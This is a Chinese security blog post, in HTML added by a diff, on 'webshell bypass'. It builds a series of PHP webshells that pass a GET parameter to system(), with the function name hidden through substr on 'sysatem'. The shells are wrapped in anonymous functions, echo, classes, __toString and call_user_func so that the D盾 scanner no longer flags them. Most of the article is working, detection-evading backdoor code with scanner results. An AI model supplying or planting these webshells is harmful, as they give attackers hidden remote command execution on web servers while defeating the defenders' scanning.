@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="p1k">
+    
+    <title>
+        
+            webshell绕过 |
+        
+        p1k&#39;s blog
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"p1keman.github.io","root":"/","language":"zh-cn"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"SBJ is SB."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.3.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                p1k&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content normal-code-theme">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">webshell绕过</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">p1k</span>
+                        <span class="level">Lv6</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i> 2020-03-05 14:11:27
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/tags/webshell/">webshell</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>之前看了smile大佬的webshell绕过，跟着smile大佬的思路，自己来挖掘了一下绕过D盾的方式</p>
+<p>附上链接 <a class="link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197631#h3-10">https://www.anquanke.com/post/id/197631#h3-10<i class="fas fa-external-link-alt"></i></a> </p>
+<p>在p神的博客中，找到了这么一个图片</p>
+<p> <a class="link" target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/dynamic-features-and-webshell-tricks-in-php.html">https://www.leavesongs.com/PENETRATION/dynamic-features-and-webshell-tricks-in-php.html<i class="fas fa-external-link-alt"></i></a> </p>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/fenlei.png" alt></p>
+<p>把常见的webshell进行了一下分类，</p>
+<h1 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h1><p>匿名函数也叫闭包函数，允许临时创建一个没有名字的函数，经常用作回调函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$name</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$greet</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p>会被D盾检测出来，已知后门</p>
+<p>把eval也改成动态获取的形式</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$method</span>(<span class="variable">$arg</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$greet</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p>会报一个级别1的风险</p>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/1.JPG" alt></p>
+<p>尝试把两个GET参数都放到函数内，再加一个substr混淆</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$method</span>=<span class="string">&#x27;sysatem&#x27;</span>;</span><br><span class="line">    (substr(<span class="variable">$method</span>,<span class="number">0</span>,<span class="number">3</span>).substr(<span class="variable">$method</span>, <span class="number">4</span>))(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$greet</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这次还是报了一个变量函数</p>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/2.JPG" alt></p>
+<p>到这就明白了 应该是$greet这个变量函数被D盾检测出来了，不是参数的原因，再进一步分析，应该是$greet() 被当作了可变函数，导致了被D盾检测出来</p>
+<h3 id="echo绕过"><a href="#echo绕过" class="headerlink" title="echo绕过"></a>echo绕过</h3><p>用echo括号绕过一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$method</span>=<span class="string">&#x27;sysatem&#x27;</span>;</span><br><span class="line">    (substr(<span class="variable">$method</span>,<span class="number">0</span>,<span class="number">3</span>).substr(<span class="variable">$method</span>, <span class="number">4</span>))(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$greet</span>)();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/3.JPG" alt></p>
+<h3 id="改匿名函数为普通函数"><a href="#改匿名函数为普通函数" class="headerlink" title="改匿名函数为普通函数"></a>改匿名函数为普通函数</h3><p>刚刚前面的检测是因为可变函数，导致了webshell被检测，直接用普通的函数，不使用匿名函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$method</span>=<span class="string">&#x27;sysatem&#x27;</span>;</span><br><span class="line">    (substr(<span class="variable">$method</span>,<span class="number">0</span>,<span class="number">3</span>).substr(<span class="variable">$method</span>, <span class="number">4</span>))(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line">greet();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/4.JPG" alt></p>
+<p>再加一个中间值$a</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$method</span>=<span class="string">&#x27;sysatem&#x27;</span>;</span><br><span class="line">    (substr(<span class="variable">$method</span>,<span class="number">0</span>,<span class="number">3</span>).substr(<span class="variable">$method</span>, <span class="number">4</span>))(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;greet&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$a</span>)();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/5.JPG" alt></p>
+<p>依然能够绕过</p>
+<h3 id="改变量为数组"><a href="#改变量为数组" class="headerlink" title="改变量为数组"></a>改变量为数组</h3><p>匿名函数可以赋值给一个变量，同样也可以赋值给数组中的一个元素</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&#x27;func&#x27;</span>] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$method</span>=<span class="string">&#x27;sysatem&#x27;</span>;</span><br><span class="line">    (substr(<span class="variable">$method</span>,<span class="number">0</span>,<span class="number">3</span>).substr(<span class="variable">$method</span>, <span class="number">4</span>))(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&#x27;func&#x27;</span>]();</span><br></pre></td></tr></table></figure>
+<p>D盾爆出可变函数</p>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/7.JPG" alt></p>
+<p>前面是在$greet上做了一些改变，下面再去改一下<code>$array[&#39;func&#39;]()</code></p>
+<p>加上注释符 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$method</span>=<span class="string">&#x27;sysatem&#x27;</span>;</span><br><span class="line">    (substr(<span class="variable">$method</span>,<span class="number">0</span>,<span class="number">3</span>).substr(<span class="variable">$method</span>, <span class="number">4</span>))(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&#x27;func&#x27;</span>]=<span class="variable">$greet</span>;</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&#x27;func&#x27;</span>]<span class="comment">/*5555*/</span>();</span><br></pre></td></tr></table></figure>
+<p>还是会爆出级别1的威胁</p>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/9.JPG" alt></p>
+<p>D盾应该也会去忽略注释的内容</p>
+<p>回到之前的用echo 输出一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$method</span>=<span class="string">&#x27;sysatem&#x27;</span>;</span><br><span class="line">    (substr(<span class="variable">$method</span>,<span class="number">0</span>,<span class="number">3</span>).substr(<span class="variable">$method</span>, <span class="number">4</span>))(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&#x27;func&#x27;</span>]=<span class="variable">$greet</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$array</span>[<span class="string">&#x27;func&#x27;</span>])();</span><br></pre></td></tr></table></figure>
+<p>这就绕过了D盾</p>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/8.JPG" alt></p>
+<p>和刚刚的使用变量名来接收一个匿名函数一样，都是因为可变函数的原因，阻碍了我们构造webshell，</p>
+<h3 id="验证一下"><a href="#验证一下" class="headerlink" title="验证一下"></a>验证一下</h3><p>把最后的调用可变函数这一步改成 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$aa();</span><br></pre></td></tr></table></figure>
+<p>$aa是一个没有任何值的变量，D盾同样会报级别1的威胁</p>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/10.JPG" alt></p>
+<p>根据$aa()这里，可以得出D盾没有去回溯$array[‘func’]这个数组变量，因为如果D盾回溯了这个$aa()变量，会检测到这个$aa()是一个空的函数，没有定义。也就不会报错了</p>
+<p>前面用的是echo，换成print同样可以绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print ($aa)();</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>上面的绕过方式，总结一下，还是利用了echo ()() 这种方式绕过了D盾，估计D盾把echo  后面的内容当作了字符串，正常情况下<code>eval($_POST[&#39;a&#39;]);</code> 是直接报级别5的，但是加上了echo 之后，报的就是级别4，看来echo还有给D盾将一个风险级别的功能</p>
+<h2 id="深入绕过"><a href="#深入绕过" class="headerlink" title="深入绕过"></a>深入绕过</h2><p>前面利用可变函数，其实就是为了调用构造的匿名函数，可以有两种绕过的方式</p>
+<p>第一种：换一种调用匿名函数的方式</p>
+<p>第二种：换掉匿名函数，比如上面直接使用了一个普通函数</p>
+<p>接下来就去php官方文档上看了一下匿名函数的介绍，找到一个例子</p>
+<p> <a class="link" target="_blank" rel="noopener" href="https://www.php.net/manual/zh/functions.anonymous.php">https://www.php.net/manual/zh/functions.anonymous.php<i class="fas fa-external-link-alt"></i></a> </p>
+<h3 id="直接调用匿名函数"><a href="#直接调用匿名函数" class="headerlink" title="直接调用匿名函数"></a>直接调用匿名函数</h3><p>匿名函数还有一种表达方式，不用赋值，直接调用，仅在php7里可以调用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$method</span>=<span class="string">&#x27;sysatem&#x27;</span>;</span><br><span class="line">    	(substr(<span class="variable">$method</span>,<span class="number">0</span>,<span class="number">3</span>).substr(<span class="variable">$method</span>, <span class="number">4</span>))(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;)(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/14.JPG" alt></p>
+<h3 id="类绕过"><a href="#类绕过" class="headerlink" title="类绕过"></a>类绕过</h3><p>在面向过程的语言里，函数就叫函数，但在面向对象的语言里，函数还有另一种叫法，方法</p>
+<p>通过构造一个类的方法，说不定就能绕过D盾的检测</p>
+<h4 id="类的方法"><a href="#类的方法" class="headerlink" title="类的方法"></a>类的方法</h4><p>匿名函数可以放在方法的返回值中，构造一个方法来调用，这时候D盾把$b()，当作一个方法，从而绕过可变函数的检测</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testing</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$method</span>=<span class="string">&#x27;sysatem&#x27;</span>;</span><br><span class="line">            (substr(<span class="variable">$method</span>,<span class="number">0</span>,<span class="number">3</span>).substr(<span class="variable">$method</span>, <span class="number">4</span>))(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$a</span>-&gt;testing();</span><br><span class="line"><span class="variable">$b</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以绕过</p>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/6.JPG" alt></p>
+<h4 id="赋值给变量"><a href="#赋值给变量" class="headerlink" title="赋值给变量"></a>赋值给变量</h4><p>也可以不放在函数的返回值中，直接把匿名函数赋值给一个变量，更方便一点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$greet</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;greet = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            	<span class="variable">$method</span>=<span class="string">&#x27;sysatem&#x27;</span>;</span><br><span class="line">	      	    (substr(<span class="variable">$method</span>,<span class="number">0</span>,<span class="number">3</span>).substr(<span class="variable">$method</span>, <span class="number">4</span>))(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="comment">//var_dump($a-&gt;greet);</span></span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$a</span>-&gt;greet;</span><br><span class="line"><span class="variable">$b</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/13.JPG" alt></p>
+<h4 id="利用魔术方法"><a href="#利用魔术方法" class="headerlink" title="利用魔术方法"></a>利用魔术方法</h4><p>利用上之前的echo函数，把一个对象当作字符串输出，可以触发<code>__toString</code>魔术方法,还可以利用上其他的魔术方法，<code>__call</code> <code>__set</code>  <code>__get</code>等</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$method</span>=<span class="string">&#x27;sysatem&#x27;</span>;</span><br><span class="line">        (substr(<span class="variable">$method</span>,<span class="number">0</span>,<span class="number">3</span>).substr(<span class="variable">$method</span>, <span class="number">4</span>))(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/12.JPG" alt></p>
+<h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>简单来说，当给一个函数传入参数时，传入了一个函数作为参数就叫函数回调</p>
+<p>使用回调函数换掉可变函数，调用匿名函数</p>
+<h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$method</span>=<span class="string">&#x27;sysatem&#x27;</span>;</span><br><span class="line">    (substr(<span class="variable">$method</span>,<span class="number">0</span>,<span class="number">3</span>).substr(<span class="variable">$method</span>, <span class="number">4</span>))(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line">call_user_func(<span class="variable">$greet</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/05/webshell%E7%BB%95%E8%BF%87/11.JPG" alt></p>
+<h4 id="数组赋值"><a href="#数组赋值" class="headerlink" title="数组赋值"></a>数组赋值</h4><p>$greet 赋值给数组，也可以执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$method</span>=<span class="string">&#x27;sysatem&#x27;</span>;</span><br><span class="line">    (substr(<span class="variable">$method</span>,<span class="number">0</span>,<span class="number">3</span>).substr(<span class="variable">$method</span>, <span class="number">4</span>))(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&#x27;func&#x27;</span>]=<span class="variable">$greet</span>;</span><br><span class="line">call_user_func(<span class="variable">$array</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p>同样可以绕过</p>
+<h2 id="总结一下："><a href="#总结一下：" class="headerlink" title="总结一下："></a>总结一下：</h2><p>主要是利用了匿名函数的一些构造方式，执行代码的核心点还是<code>(substr($method,0,3).substr($method, 4))($_GET[&#39;arg&#39;]);</code> 没有变过</p>
+<p>主要是在可变函数这里展开了一些绕过方式，让D盾检测不出来</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：webshell绕过</li>
+        <li>Post author：p1k</li>
+        <li>Create time：2020-03-05 14:11:27</li>
+        <li>
+            Post link：http://p1keman.github.io/2020/03/05/webshell绕过/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/03/09/BUU-three/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">BUU-three</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/03/03/%E4%B8%80%E7%82%B9%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A0%BC%E5%BC%8F%E7%9F%A5%E8%AF%86/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">一点虚拟机格式知识</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">p1k</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
